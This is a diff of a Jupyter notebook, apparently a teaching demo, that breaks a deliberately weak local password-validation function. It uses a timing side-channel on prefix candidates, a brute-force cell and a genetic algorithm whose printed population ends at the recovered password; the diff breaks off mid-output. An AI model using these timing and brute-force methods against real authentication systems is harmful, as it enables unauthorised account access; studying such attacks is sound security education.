xREQ8lgqMyHmsSMnkqQ93UO4waBMVzPx74ogJDzQ7loiIR1OBEfkNZRVO\/v7RTpanZAIwoGNDnr+jE4G++rURETGb\/hKLnMOJwlImLN9M6uF8LBZ4tG9rxl\/bQue7iIjUECowIr+w\/aiNcUs3cdxWQrCfNy8O6cL1bSPNjiUiIj+jAiPyM+9vOcaUd7dRWuGkef0g5t0TR8uIOmbHEhGRX1CBEQEcToPn1uxh3vqDAFzXugEvDulKaICPyclERORcVGDE4xWcLuPBlVv4Zv9JACZc14LJN7TGy6rzXUREaioVGPFoe3MKGbd0E0d+OE2AjxfP39GJmztFmx1LRETOQwVGPNaaHTlMfjuD02UOGtcNYN7wONpFh5gdS0RELoAKjHgcp9PgpXX7eWndfgASmtdjdlI3woN8TU4mIiIXSgVGPEpRaQUPv5XB2l25AIy8silP3NQWHy+ryclERORiqMCIxzh8spixb2xif14Rvl5Wpt\/agTviYsyOJSIil0AFRjzCV3vz+NPKLdhLKogM8WPu3d3pGlvX7FgiInKJVGCkVjMMg3nrD\/Lcmj04DegaG8Zrd3cnIsTf7GgiIvI7qMBIrXWmzMGUd7fx4dZsAO6Ki+Efg9rj5+1lcjIREfm9VGCkVjpWcIZxb2xiZ7Ydb6uFpwa24+5eTfQwRhGRWqLKL71wOBxMmzaNZs2aERAQQIsWLXj66acxDMM1xjAMnnzySRo2bEhAQACJiYns37+\/0nry8\/NJSkoiJCSEsLAwRo8eTVFRUVXHlVoo5eAP\/PHlDezMthMe5MuyMfEMT2iq8iIiUotUeYF57rnnmDNnDq+88gq7d+\/mueeeY+bMmbz88suuMTNnzmTWrFnMnTuXlJQUgoKC6NevHyUlJa4xSUlJ7Ny5k7Vr17J69WrWr1\/PuHHjqjqu1CKGYbA0+TBJC1L4obiM9tEhfDjxSno1r2d2NBERqWIW4+eHRqrAzTffTGRkJAsXLnTNGzx4MAEBASxbtgzDMIiOjuaRRx7h0UcfBcBmsxEZGcnixYsZMmQIu3fvpl27dqSlpREXFwfAmjVruOmmmzh69CjR0ee\/1bvdbic0NBSbzUZIiO6uWtuVVjh46oOdvJmWBcDAztHMHNyJAF+d7yIi4k4udP9d5Udgevfuzbp169i3bx8AW7duZcOGDfTv3x+AQ4cOkZOTQ2Jious1oaGhxMfHk5ycDEBycjJhYWGu8gKQmJiI1WolJSXlnNstLS3FbrdXmsQz5NlLGDpvI2+mZWGxwNT+bZg1pIvKi4hILVblJ\/FOnToVu91OmzZt8PLywuFwMH36dJKSkgDIyckBIDIystLrIiMjXctycnKIiIioHNTbm\/DwcNeYX5oxYwZ\/\/\/vfq\/rtSA23J8fOiNdTybWXEuzvzctDu3Jt64jzv1BERNxalR+Befvtt1m+fDkrVqxg8+bNLFmyhH\/9618sWbKkqjdVyeOPP47NZnNNWVlZ1bo9Md+2owUMmbeRXHspLSPq8OHEPiovIiIeosqPwDz22GNMnTqVIUOGANCxY0eOHDnCjBkzGDFiBFFRUQDk5ubSsGFD1+tyc3Pp0qULAFFRUeTl5VVab0VFBfn5+a7X\/5Kfnx9+fn5V\/Xakhtp0OJ+Ri9IoLK2gS0wYS0b2JDTQx+xYIiJymVT5EZjTp09jtVZerZeXF06nE4BmzZoRFRXFunXrXMvtdjspKSkkJCQAkJCQQEFBAenp6a4xX3zxBU6nk\/j4+KqOLG7muwMnGb4wlcLSCno2C2fZmHiVFxERD1PlR2AGDhzI9OnTiY2NpX379mzZsoUXXniBUaNGAWCxWJg0aRLPPPMMrVq1olmzZkybNo3o6GgGDRoEQNu2bbnxxhsZO3Ysc+fOpby8nIkTJzJkyJALugJJaq8v9+Rx37J0yiqcXNWqPvOGx+lkXRERD1TlBebll19m2rRpjB8\/nry8PKKjo7nvvvt48sknXWP+\/Oc\/U1xczLhx4ygoKKBPnz6sWbMGf\/\/\/\/3ya5cuXM3HiRK6\/\/nqsViuDBw9m1qxZVR1X3Min24\/zpze3UO4wSGwbyeykrnosgIiIh6ry+8DUFLoPTO3y\/pZjPPLOVhxOg5s7NeQ\/d3XBx6vK\/wMqIiImu9D9t56FJDXeytRMnli1HcOA27s35rnBnfCy6rEAIiKeTAVGarTXNxziH6t3ATC8VxP+\/sf2WFVeREQ8ngqM1FizvzzA85\/tBWDc1c15vH8bPZBRREQAFRipgQzD4IW1+3j5iwMAPHR9KyYltlJ5ERERFxUYqVEMw+CZj3ezcMMh4Oxzje6\/poXJqUREpKZRgZEaw+k0mPbBDpanZALw9z+2Z0TvpuaGEhGRGkkFRmqECoeTP7+7jfc2H8Nigedu68SdPWLMjiUiIjWUCoyYrqzCycNvZfDx9uN4WS28cGdnbunSyOxYIiJSg6nAiKlKyh1MWL6ZdXvy8PGy8PLQbtzY4dwP7BQREfmJCoyY5nRZBePeSGfDgZP4eVt5bXh3rm0dYXYsERFxAyowYorCknJGLU4j7fApAn29WDiiBwkt6pkdS0RE3IQKjFx2BafLGPF6KluP2gj292bxyJ50b1LX7FgiIuJGVGDksjpZVMrdC1LYk1NI3UAflo6Op0OjULNjiYiIm1GBkcsmx1ZC0oKNfH+imPp1\/Fg+Jp7WUcFmxxIRETekAiOXRVb+aZIWpJCZf5qGof4sHxNP8wZ1zI4lIiJuSgVGqt2hk8Ukzd9Itq2EmPAAVozpRUx4oNmxRETEjanASLXal1tI0oIUThSW0rxBECvG9CIq1N\/sWCIi4uZUYKTa7DhmY\/jCFE6dLqdNVDBLR8fTINjP7FgiIlILqMBItdiceYoRr6dSWFJBp8ahvDGqJ2GBvmbHEhGRWkIFRqrcxoM\/MHpxGsVlDuKa1OX1kT0I8fcxO5aIiNQiKjBSpb7ed4Jxb2yitMLJlS3rMf+eOAJ99WMmIiJVS3sWqTL\/tzOHiSu2UOZw8oc2Ebya1A1\/Hy+zY4mISC2kAiNV4sOt2Tz8VgYOp8FNHaN48a6u+HpbzY4lIiK1lAqM\/G5vb8piyrvbMAy4rWsjZt7eCW8vlRcREak+KjDyu7yRfJgnP9gJwNCesUwf1AGr1WJyKhERqe1UYOSSvfb198z4dA8Ao65sxrSb22KxqLyIiEj1U4GRi2YYBi+t28+Ln+8HYOJ1LXmk7xUqLyIictmowMhFMQyDf366h9fWHwTgsX6tmXBdS5NTiYiIp1GBkQvmdBr87aOdvJF8BIBpN7djdJ9mJqcSERFPpAIjF8ThNJj67jbeST+KxQLTB3VkWHys2bFERMRDqcDIeZU7nEx+eysfbc3GaoF\/39mZW7s2NjuWiIh4MBUY+Z9KKxxMXLGFtbty8bZamDW0Kzd1bGh2LBER8XAqMPKbzpQ5uG9ZOuv3ncDX28rcu7vxhzaRZscSERFRgZFzKyqtYPTiNFIO5RPg48WCEXFc2bK+2bFEREQAFRg5B9uZcu5dlMqWzALq+HmzaGQPejQNNzuWiIiIiwqMVJJfXMbwhSnszLYTGuDDG6N60jkmzOxYIiIilajAiEuevYSkBSnszyuifh1flo6Op23DELNjiYiI\/IoKjABwrOAMSfM3cviH00SG+LF8TC9aRtQxO5aIiMg5qcAIR34oZtj8FI4VnKFx3QBWjOlFbL1As2OJiIj8JhUYD3cgr5Bh81PIKyylef0glo2JJzoswOxYIiIi\/5MKjAfblW1n+MIUfiguo3VkMEvH9CQi2N\/sWCIiIuelAuOBfigq5b\/pR5n95QHsJRV0aBTC0lHx1A3yNTuaiIjIBVGB8RCGYZB6KJ\/lKZms2ZFDmcMJQLfYMBaN7ElogI\/JCUVERC6cCkwtZztdzrubj7IiNZMDeUWu+Z0ah5IUH8stXRrh7+NlYkIREZGLpwJTCxmGwebMAlakZLJ6WzalFWePtgT6enFLl2iG9WxCx8ahJqcUERG5dCowtUhhSTnvZ2SzfOMR9uQUuua3bRjy49GWaIL99a8iERFxf9aqXmHTpk2xWCy\/miZMmABASUkJEyZMoF69etSpU4fBgweTm5tbaR2ZmZkMGDCAwMBAIiIieOyxx6ioqKjqqLXG9qM2Hn9vG\/HPrmPa+zvYk1OIn7eV27s35r3xvfnkT324u1cTlRcREak1qvwITFpaGg6Hw\/X1jh07uOGGG7jjjjsAePjhh\/n444955513CA0NZeLEidx22218++23ADgcDgYMGEBUVBTfffcdx48f55577sHHx4dnn322quO6reLSCj7ams3ylEy2H7O55reMqENSfCy3dW1MaKAKi4iI1E4WwzCM6tzApEmTWL16Nfv378dut9OgQQNWrFjB7bffDsCePXto27YtycnJ9OrVi08\/\/ZSbb76Z7OxsIiMjAZg7dy5TpkzhxIkT+Ppe2KW+drud0NBQbDYbISG153k+u4\/bWZGSyaotxygqPXtUytfLSv+OUSTFN6FH07pYLBaTU4qIiFyaC91\/V+s5MGVlZSxbtozJkydjsVhIT0+nvLycxMRE15g2bdoQGxvrKjDJycl07NjRVV4A+vXrxwMPPMDOnTvp2rVrdUaukUrKHazedpwVKUfYnFngmt+0XiDD4mO5vXsM4bqHi4iIeJBqLTDvv\/8+BQUF3HvvvQDk5OTg6+tLWFhYpXGRkZHk5OS4xvy8vPy0\/Kdlv6W0tJTS0lLX13a7vQregbkO5BWxIiWTdzcfxXamHABvq4V+7aMYFh9LQvN6WK062iIiIp6nWgvMwoUL6d+\/P9HR0dW5GQBmzJjB3\/\/+92rfTnUrrXCwZkcOK1IySTmU75rfuG4AQ3vGckdcY93uX0REPF61FZgjR47w+eef895777nmRUVFUVZWRkFBQaWjMLm5uURFRbnGpKamVlrXT1cp\/TTmXB5\/\/HEmT57s+tputxMTE1MVb+WyOHyymJWpmbyTfpT84jIArBa4vm0kw+JjubpVA7x0tEVERASoxgKzaNEiIiIiGDBggGte9+7d8fHxYd26dQwePBiAvXv3kpmZSUJCAgAJCQlMnz6dvLw8IiIiAFi7di0hISG0a9fuN7fn5+eHn59fdb2dalHucPL5rlyWp2Sy4cBJ1\/yGof7c1SOGu3rE0DBUT4YWERH5pWopME6nk0WLFjFixAi8vf\/\/JkJDQxk9ejSTJ08mPDyckJAQHnzwQRISEujVqxcAffv2pV27dgwfPpyZM2eSk5PDX\/\/6VyZMmOB2BeW3HD11mjdTs3hrUxYnCs+et2OxwLVXNGBYfBOua90Ab68qv0WPiIhIrVEtBebzzz8nMzOTUaNG\/WrZf\/7zH6xWK4MHD6a0tJR+\/frx6quvupZ7eXmxevVqHnjgARISEggKCmLEiBH84x\/\/qI6ol02Fw8mXe0+wIuUIX+07wU8Xr9ev48eQH4+2xIQHmhtSRETETVT7fWDMUlPuA5NjK+HNtEzeSsviuK3ENb9Py\/okxceS2C4SHx1tERERAWrIfWA8ldNpsH7\/CZanZPLFnjwczrMdMTzIlzu6N2Zoz1ia1g8yOaWIiIj7UoGpQicKS3l7UxYrUzM5euqMa37PZuEkxcdyY4co\/Ly9TEwoIiJSO6jA\/E5Op0HywR9YkZLJZztzqPjxaEuIvzeDuzcmKT6WlhHBJqcUERGpXVRgLlF+cRn\/Tc9iZWoWh04Wu+Z3iw1jWHwTbu7UEH8fHW0RERGpDiowFyn9SD5Lk4\/wyfYcyhxOAOr4eXNr10YMi4+lbcPa8+BIERGRmkoF5iL9N\/0o72dkA9CxUShJ8bEM7BxNkJ++lSIiIpeL9roXKSm+CYYBw+Jj6dQ4zOw4IiIiHkkF5iJ1aBTKPwd3MjuGiIiIR9Md1ERERMTtqMCIiIiI21GBEREREbejAiMiIiJuRwVGRERE3I4KjIiIiLgdFRgRERFxOyowIiIi4nZUYERERMTtqMCIiIiI21GBEREREbejAiMiIiJuRwVGRERE3E6tfRq1YRgA2O12k5OIiIjIhfppv\/3Tfvy31NoCU1hYCEBMTIzJSURERORiFRYWEhoa+pvLLcb5Ko6bcjqdZGdnExwcjMViqdJ12+12YmJiyMrKIiQkpErXLRdPn0fNos+jZtHnUbPo8zg\/wzAoLCwkOjoaq\/W3z3SptUdgrFYrjRs3rtZthISE6AewBtHnUbPo86hZ9HnULPo8\/rf\/deTlJzqJV0RERNyOCoyIiIi4HRWYS+Dn58dTTz2Fn5+f2VEEfR41jT6PmkWfR82iz6Pq1NqTeEVERKT20hEYERERcTsqMCIiIuJ2VGBERETE7ajAiIiIiNtRgblIs2fPpmnTpvj7+xMfH09qaqrZkTzSjBkz6NGjB8HBwURERDBo0CD27t1rdiz50T\/\/+U8sFguTJk0yO4pHO3bsGHfffTf16tUjICCAjh07smnTJrNjeSSHw8G0adNo1qwZAQEBtGjRgqeffvq8z\/uR36YCcxHeeustJk+ezFNPPcXmzZvp3Lkz\/fr1Iy8vz+xoHufrr79mwoQJbNy4kbVr11JeXk7fvn0pLi42O5rHS0tL47XXXqNTp05mR\/Fop06d4sorr8THx4dPP\/2UXbt28e9\/\/5u6deuaHc0jPffcc8yZM4dXXnmF3bt389xzzzFz5kxefvlls6O5LV1GfRHi4+Pp0aMHr7zyCnD2eUsxMTE8+OCDTJ061eR0nu3EiRNERETw9ddfc\/XVV5sdx2MVFRXRrVs3Xn31VZ555hm6dOnCiy++aHYsjzR16lS+\/fZbvvnmG7OjCHDzzTcTGRnJwoULXfMGDx5MQEAAy5YtMzGZ+9IRmAtUVlZGeno6iYmJrnlWq5XExESSk5NNTCYANpsNgPDwcJOTeLYJEyYwYMCASr8nYo4PP\/yQuLg47rjjDiIiIujatSvz5883O5bH6t27N+vWrWPfvn0AbN26lQ0bNtC\/f3+Tk7mvWvswx6p28uRJHA4HkZGRleZHRkayZ88ek1IJnD0SNmnSJK688ko6dOhgdhyP9eabb7J582bS0tLMjiLAwYMHmTNnDpMnT+aJJ54gLS2NP\/3pT\/j6+jJixAiz43mcqVOnYrfbadOmDV5eXjgcDqZPn05SUpLZ0dyWCoy4vQkTJrBjxw42bNhgdhSPlZWVxUMPPcTatWvx9\/c3O45wttjHxcXx7LPPAtC1a1d27NjB3LlzVWBM8Pbbb7N8+XJWrFhB+\/btycjIYNKkSURHR+vzuEQqMBeofv36eHl5kZubW2l+bm4uUVFRJqWSiRMnsnr1atavX0\/jxo3NjuOx0tPTycvLo1u3bq55DoeD9evX88orr1BaWoqXl5eJCT1Pw4YNadeuXaV5bdu25d133zUpkWd77LHHmDp1KkOGDAGgY8eOHDlyhBkzZqjAXCKdA3OBfH196d69O+vWrXPNczqdrFu3joSEBBOTeSbDMJg4cSKrVq3iiy++oFmzZmZH8mjXX38927dvJyMjwzXFxcWRlJRERkaGyosJrrzyyl\/dWmDfvn00adLEpESe7fTp01itlXe5Xl5eOJ1OkxK5Px2BuQiTJ09mxIgRxMXF0bNnT1588UWKi4sZOXKk2dE8zoQJE1ixYgUffPABwcHB5OTkABAaGkpAQIDJ6TxPcHDwr84\/CgoKol69ejovySQPP\/wwvXv35tlnn+XOO+8kNTWVefPmMW\/ePLOjeaSBAwcyffp0YmNjad++PVu2bOGFF15g1KhRZkdzX4ZclJdfftmIjY01fH19jZ49exobN240O5JHAs45LVq0yOxo8qNrrrnGeOihh8yO4dE++ugjo0OHDoafn5\/Rpk0bY968eWZH8lh2u9146KGHjNjYWMPf399o3ry58Ze\/\/MUoLS01O5rb0n1gRERExO3oHBgRERFxOyowIiIi4nZUYERERMTtqMCIiIiI21GBEREREbejAiMiIiJuRwVGRERE3I4KjIiIiLgdFRgRERFxOyowIiIi4nZUYERERMTtqMCIiIiI2\/l\/PcjPDnkIEfIAAAAASUVORK5CYII=\",\n       \"text\/plain\": [\n        \"<Figure size 640x480 with 1 Axes>\"\n       ]\n@@ -67,34 +69,62 @@\n     \"\\n\",\n     \"from auth import validate\\n\",\n     \"\\n\",\n+    \"import statistics\\n\",\n     \"\\n\",\n     \"candidates = [\\n\",\n-    \"    \\\"11111111\\\",\\n\",\n-    \"    \\\"12111111\\\",\\n\",\n-    \"    \\\"12311111\\\",\\n\",\n-    \"    \\\"12341111\\\",\\n\",\n-    \"    \\\"12345111\\\",\\n\",\n-    \"    \\\"12345611\\\",\\n\",\n-    \"    \\\"12345671\\\",\\n\",\n-    \"    \\\"12345678\\\",\\n\",\n+    \"    \\\"0000000000\\\",\\n\",\n+    \"    \\\"0100000000\\\",\\n\",\n+    \"    \\\"0120000000\\\",\\n\",\n+    \"    \\\"0123000000\\\",\\n\",\n+    \"    \\\"0123400000\\\",\\n\",\n+    \"    \\\"0123450000\\\",\\n\",\n+    \"    \\\"0123456000\\\",\\n\",\n+    \"    \\\"0123456700\\\",\\n\",\n+    \"    \\\"0123456780\\\",\\n\",\n+    \"    \\\"0123456789\\\",\\n\",\n     \"]\\n\",\n     \"\\n\",\n-    \"nanoseconds = [0 for _ in range(8)]\\n\",\n+    \"nanoseconds = [0 for _ in range(len(candidates))]\\n\",\n     \"\\n\",\n     \"for i, candidate in enumerate(candidates):\\n\",\n-    \"    accumulator = 0\\n\",\n-    \"    iterations = 25\\n\",\n+    \"    iterations = 10\\n\",\n+    \"    results = []\\n\",\n     \"    for j in range(iterations):\\n\",\n     \"        start = time.time_ns()\\n\",\n     \"        validate(candidate)\\n\",\n     \"        end = time.time_ns()\\n\",\n-    \"        accumulator += end - start\\n\",\n-    \"    nanoseconds[i] = accumulator \/ iterations\\n\",\n+    \"        results.append(end - start)\\n\",\n+    \"    nanoseconds[i] = statistics.median(results)\\n\",\n     \"    print(f\\\"{candidate} - {nanoseconds[i]}\\\")\\n\",\n     \"\\n\",\n     \"plt.plot(nanoseconds)\"\n    ]\n   },\n+  {\n+   \"attachments\": {},\n+   \"cell_type\": \"markdown\",\n+   \"metadata\": {},\n+   \"source\": [\n+    \"The following cell runs a Brute Force Algorithm to try all possible passwords against the weak password\\n\",\n+    \"validation function:\"\n+   ]\n+  },\n+  {\n+   \"cell_type\": \"code\",\n+   \"execution_count\": null,\n+   \"metadata\": {},\n+   \"outputs\": [],\n+   \"source\": [\n+    \"from bf import main\\n\",\n+    \"\\n\",\n+    \"args = {\\n\",\n+    \"    \\\"NUMBER_ITERATIONS\\\": 0,\\n\",\n+    \"    \\\"BRAKE_ON_SOLUTION\\\": True,\\n\",\n+    \"}\\n\",\n+    \"\\n\",\n+    \"%time main(args=args)\"\n+   ]\n+  },\n   {\n    \"attachments\": {},\n    \"cell_type\": \"markdown\",\n@@ -107,7 +137,7 @@\n   },\n   {\n    \"cell_type\": \"code\",\n-   \"execution_count\": 21,\n+   \"execution_count\": 43,\n    \"metadata\": {},\n    \"outputs\": [\n     {\n@@ -116,230 +146,246 @@\n      \"text\": [\n       \"Initial Population\\n\",\n       \"\\n\",\n-      \"Member 12768226 Fitness 3468.0\\n\",\n-      \"Member 45272323 Fitness 577.0\\n\",\n-      \"Member 36282187 Fitness 428.0\\n\",\n-      \"Member 38366232 Fitness 405.0\\n\",\n-      \"Member 38214326 Fitness 408.0\\n\",\n-      \"Member 34783646 Fitness 431.0\\n\",\n-      \"Member 62561463 Fitness 406.0\\n\",\n-      \"Member 22862536 Fitness 505.0\\n\",\n-      \"Member 36685785 Fitness 412.0\\n\",\n-      \"Member 74548746 Fitness 409.0\\n\",\n-      \"Member 86278651 Fitness 451.0\\n\",\n-      \"Member 46154556 Fitness 424.0\\n\",\n-      \"Member 77826454 Fitness 403.0\\n\",\n-      \"Member 61416445 Fitness 408.0\\n\",\n-      \"Member 73281347 Fitness 7974.0\\n\",\n-      \"Member 48536873 Fitness 1292.0\\n\",\n-      \"Member 16337357 Fitness 759.0\\n\",\n-      \"Member 56663723 Fitness 431.0\\n\",\n-      \"Member 28436716 Fitness 410.0\\n\",\n-      \"Member 62113735 Fitness 424.0\\n\",\n-      \"Member 16775437 Fitness 480.0\\n\",\n-      \"Member 46281544 Fitness 422.0\\n\",\n-      \"Member 64366128 Fitness 421.0\\n\",\n-      \"Member 86344167 Fitness 408.0\\n\",\n-      \"Member 71561246 Fitness 406.0\\n\",\n-      \"Member 57246453 Fitness 414.0\\n\",\n-      \"Member 13524783 Fitness 479.0\\n\",\n-      \"Member 11883634 Fitness 474.0\\n\",\n-      \"Member 72868768 Fitness 413.0\\n\",\n-      \"Member 84372441 Fitness 406.0\\n\",\n-      \"Member 78437762 Fitness 420.0\\n\",\n-      \"Member 67343167 Fitness 404.0\\n\",\n-      \"Member 53128664 Fitness 459.0\\n\",\n-      \"Member 71373746 Fitness 410.0\\n\",\n-      \"Member 64164847 Fitness 406.0\\n\",\n-      \"Member 13466716 Fitness 476.0\\n\",\n-      \"Member 64554783 Fitness 403.0\\n\",\n-      \"Member 51643454 Fitness 401.0\\n\",\n-      \"Member 88233282 Fitness 407.0\\n\",\n-      \"Member 45413862 Fitness 407.0\\n\",\n-      \"Member 38338376 Fitness 407.0\\n\",\n-      \"Member 51842532 Fitness 408.0\\n\",\n-      \"Member 23735788 Fitness 419.0\\n\",\n-      \"Member 68157322 Fitness 418.0\\n\",\n-      \"Member 27845475 Fitness 403.0\\n\",\n-      \"Member 64137374 Fitness 411.0\\n\",\n-      \"Member 45766414 Fitness 414.0\\n\",\n-      \"Member 46264837 Fitness 403.0\\n\",\n-      \"Member 81717146 Fitness 406.0\\n\",\n-      \"Member 68643437 Fitness 417.0\\n\",\n-      \"Member 57145517 Fitness 407.0\\n\",\n-      \"Member 74523787 Fitness 416.0\\n\",\n-      \"Member 48662742 Fitness 674.0\\n\",\n-      \"Member 55624274 Fitness 592.0\\n\",\n-      \"Member 13837345 Fitness 517.0\\n\",\n-      \"Member 24364687 Fitness 411.0\\n\",\n-      \"Member 34518558 Fitness 397.0\\n\",\n-      \"Member 36458548 Fitness 396.0\\n\",\n-      \"Member 75241652 Fitness 413.0\\n\",\n-      \"Member 67743583 Fitness 401.0\\n\",\n-      \"Member 36442321 Fitness 393.0\\n\",\n-      \"Member 87473453 Fitness 402.0\\n\",\n-      \"Member 42741286 Fitness 519.0\\n\",\n-      \"Member 34768575 Fitness 399.0\\n\",\n-      \"Member 78874735 Fitness 1510.0\\n\",\n-      \"Member 85857474 Fitness 386.0\\n\",\n-      \"Member 55757162 Fitness 393.0\\n\",\n-      \"Member 18365667 Fitness 451.0\\n\",\n-      \"Member 54288566 Fitness 387.0\\n\",\n-      \"Member 86518134 Fitness 380.0\\n\",\n-      \"Member 34314688 Fitness 393.0\\n\",\n-      \"Member 13375742 Fitness 457.0\\n\",\n-      \"Member 77861567 Fitness 389.0\\n\",\n-      \"Member 16586528 Fitness 453.0\\n\",\n-      \"Member 21777188 Fitness 381.0\\n\",\n-      \"Member 63638141 Fitness 395.0\\n\",\n-      \"Member 78468757 Fitness 395.0\\n\",\n-      \"Member 63436637 Fitness 383.0\\n\",\n-      \"Member 85265733 Fitness 396.0\\n\",\n-      \"Member 12276656 Fitness 554.0\\n\",\n-      \"Member 13648266 Fitness 471.0\\n\",\n-      \"Member 82482257 Fitness 390.0\\n\",\n-      \"Member 26873215 Fitness 385.0\\n\",\n-      \"Member 88133862 Fitness 388.0\\n\",\n-      \"Member 16218247 Fitness 751.0\\n\",\n-      \"Member 85731416 Fitness 486.0\\n\",\n-      \"Member 58144835 Fitness 401.0\\n\",\n-      \"Member 53223362 Fitness 353.0\\n\",\n-      \"Member 81246657 Fitness 357.0\\n\",\n-      \"Member 55531155 Fitness 353.0\\n\",\n-      \"Member 86358732 Fitness 353.0\\n\",\n-      \"Member 73588381 Fitness 355.0\\n\",\n-      \"Member 44684663 Fitness 348.0\\n\",\n-      \"Member 61425155 Fitness 350.0\\n\",\n-      \"Member 26131633 Fitness 354.0\\n\",\n-      \"Member 16338737 Fitness 419.0\\n\",\n-      \"Member 84311853 Fitness 345.0\\n\",\n-      \"Member 23683727 Fitness 349.0\\n\",\n-      \"Member 43258667 Fitness 357.0\\n\",\n-      \"Member 33828148 Fitness 346.0\\n\",\n+      \"Member 5907977324 Fitness 550.0\\n\",\n+      \"Member 4733733406 Fitness 487.5\\n\",\n+      \"Member 9984492149 Fitness 486.0\\n\",\n+      \"Member 7325395088 Fitness 484.5\\n\",\n+      \"Member 2713120902 Fitness 485.5\\n\",\n+      \"Member 9697067945 Fitness 490.5\\n\",\n+      \"Member 3322742834 Fitness 471.0\\n\",\n+      \"Member 8549971899 Fitness 480.0\\n\",\n+      \"Member 4230429464 Fitness 469.5\\n\",\n+      \"Member 6819616862 Fitness 416.5\\n\",\n+      \"Member 9367625190 Fitness 412.5\\n\",\n+      \"Member 2175488491 Fitness 416.5\\n\",\n+      \"Member 9617400268 Fitness 419.5\\n\",\n+      \"Member 8102348730 Fitness 420.0\\n\",\n+      \"Member 9825634787 Fitness 419.0\\n\",\n+      \"Member 5703468382 Fitness 419.5\\n\",\n+      \"Member 0694631703 Fitness 490.5\\n\",\n+      \"Member 2896013869 Fitness 414.0\\n\",\n+      \"Member 1694155278 Fitness 418.5\\n\",\n+      \"Member 3447529347 Fitness 418.5\\n\",\n+      \"Member 6700165119 Fitness 418.0\\n\",\n+      \"Member 5194666309 Fitness 421.5\\n\",\n+      \"Member 8338349511 Fitness 415.5\\n\",\n+      \"Member 2033032545 Fitness 418.5\\n\",\n+      \"Member 8974484480 Fitness 418.0\\n\",\n+      \"Member 0263620206 Fitness 492.5\\n\",\n+      \"Member 8649584903 Fitness 417.5\\n\",\n+      \"Member 0493141883 Fitness 488.0\\n\",\n+      \"Member 8412616651 Fitness 417.5\\n\",\n+      \"Member 3020425347 Fitness 416.5\\n\",\n+      \"Member 7955785370 Fitness 415.5\\n\",\n+      \"Member 3835386862 Fitness 418.5\\n\",\n+      \"Member 2026655809 Fitness 414.5\\n\",\n+      \"Member 0243618695 Fitness 490.0\\n\",\n+      \"Member 5029041616 Fitness 419.5\\n\",\n+      \"Member 5564402068 Fitness 417.0\\n\",\n+      \"Member 8899024568 Fitness 411.5\\n\",\n+      \"Member 9409828285 Fitness 421.0\\n\",\n+      \"Member 7225134213 Fitness 417.0\\n\",\n+      \"Member 8090919540 Fitness 417.0\\n\",\n+      \"Member 9098685535 Fitness 414.5\\n\",\n+      \"Member 7787626805 Fitness 415.5\\n\",\n+      \"Member 2723725105 Fitness 415.5\\n\",\n+      \"Member 3225412971 Fitness 415.5\\n\",\n+      \"Member 1326642040 Fitness 415.0\\n\",\n+      \"Member 2529538818 Fitness 419.0\\n\",\n+      \"Member 9254402050 Fitness 416.5\\n\",\n+      \"Member 7905483291 Fitness 415.0\\n\",\n+      \"Member 9854878817 Fitness 415.0\\n\",\n+      \"Member 0923256035 Fitness 491.0\\n\",\n+      \"Member 1184940402 Fitness 425.0\\n\",\n+      \"Member 3837586007 Fitness 418.0\\n\",\n+      \"Member 1508273979 Fitness 415.0\\n\",\n+      \"Member 2592816519 Fitness 423.0\\n\",\n+      \"Member 3528634984 Fitness 417.0\\n\",\n+      \"Member 7413318269 Fitness 418.5\\n\",\n+      \"Member 5960965902 Fitness 417.5\\n\",\n+      \"Member 9902982710 Fitness 414.5\\n\",\n+      \"Member 7533723588 Fitness 417.5\\n\",\n+      \"Member 2965051943 Fitness 421.5\\n\",\n+      \"Member 2986959709 Fitness 419.0\\n\",\n+      \"Member 4913398649 Fitness 416.0\\n\",\n+      \"Member 8768364711 Fitness 419.0\\n\",\n+      \"Member 9487963086 Fitness 421.0\\n\",\n+      \"Member 6169020787 Fitness 417.5\\n\",\n+      \"Member 0584329551 Fitness 491.5\\n\",\n+      \"Member 1479080731 Fitness 421.5\\n\",\n+      \"Member 7660881335 Fitness 417.0\\n\",\n+      \"Member 0792036011 Fitness 489.5\\n\",\n+      \"Member 4951608870 Fitness 420.0\\n\",\n+      \"Member 8112628468 Fitness 412.5\\n\",\n+      \"Member 0409867603 Fitness 489.5\\n\",\n+      \"Member 5276709489 Fitness 422.0\\n\",\n+      \"Member 5095125521 Fitness 415.5\\n\",\n+      \"Member 5022505902 Fitness 413.0\\n\",\n+      \"Member 7768160610 Fitness 414.5\\n\",\n+      \"Member 9169206325 Fitness 414.5\\n\",\n+      \"Member 6929031892 Fitness 419.0\\n\",\n+      \"Member 4221318339 Fitness 422.0\\n\",\n+      \"Member 9150596883 Fitness 429.5\\n\",\n+      \"Member 8465287806 Fitness 418.0\\n\",\n+      \"Member 2315980026 Fitness 417.0\\n\",\n+      \"Member 1870418335 Fitness 416.0\\n\",\n+      \"Member 5688380286 Fitness 416.5\\n\",\n+      \"Member 7453403956 Fitness 420.0\\n\",\n+      \"Member 2606660719 Fitness 414.5\\n\",\n+      \"Member 3970730154 Fitness 419.5\\n\",\n+      \"Member 6473001563 Fitness 419.0\\n\",\n+      \"Member 1748416964 Fitness 414.5\\n\",\n+      \"Member 0300262392 Fitness 495.0\\n\",\n+      \"Member 5689483389 Fitness 424.5\\n\",\n+      \"Member 0685887161 Fitness 491.5\\n\",\n+      \"Member 2168534825 Fitness 418.5\\n\",\n+      \"Member 7392336367 Fitness 418.5\\n\",\n+      \"Member 4440655355 Fitness 417.0\\n\",\n+      \"Member 4939741010 Fitness 415.0\\n\",\n+      \"Member 6817876608 Fitness 417.5\\n\",\n+      \"Member 1134173412 Fitness 415.5\\n\",\n+      \"Member 6957798395 Fitness 423.0\\n\",\n+      \"Member 1027251360 Fitness 417.0\\n\",\n       \"\\n\",\n       \"Solution Found\\n\",\n       \"\\n\",\n-      \"Member 12345678 Fitness 1799.0\\n\",\n+      \"Member 0123456789 Fitness 1239.0\\n\",\n       \"\\n\",\n       \"Final Population\\n\",\n       \"\\n\",\n-      \"Member 13345684 Fitness 638.0\\n\",\n-      \"Member 12275488 Fitness 466.0\\n\",\n-      \"Member 12721688 Fitness 464.0\\n\",\n-      \"Member 12376683 Fitness 537.0\\n\",\n-      \"Member 11376178 Fitness 403.0\\n\",\n-      \"Member 11376173 Fitness 424.0\\n\",\n-      \"Member 52276684 Fitness 354.0\\n\",\n-      \"Member 12676688 Fitness 463.0\\n\",\n-      \"Member 12376628 Fitness 523.0\\n\",\n-      \"Member 12374824 Fitness 503.0\\n\",\n-      \"Member 12346178 Fitness 572.0\\n\",\n-      \"Member 31372784 Fitness 349.0\\n\",\n-      \"Member 12346644 Fitness 565.0\\n\",\n-      \"Member 17336657 Fitness 561.0\\n\",\n-      \"Member 12344488 Fitness 596.0\\n\",\n-      \"Member 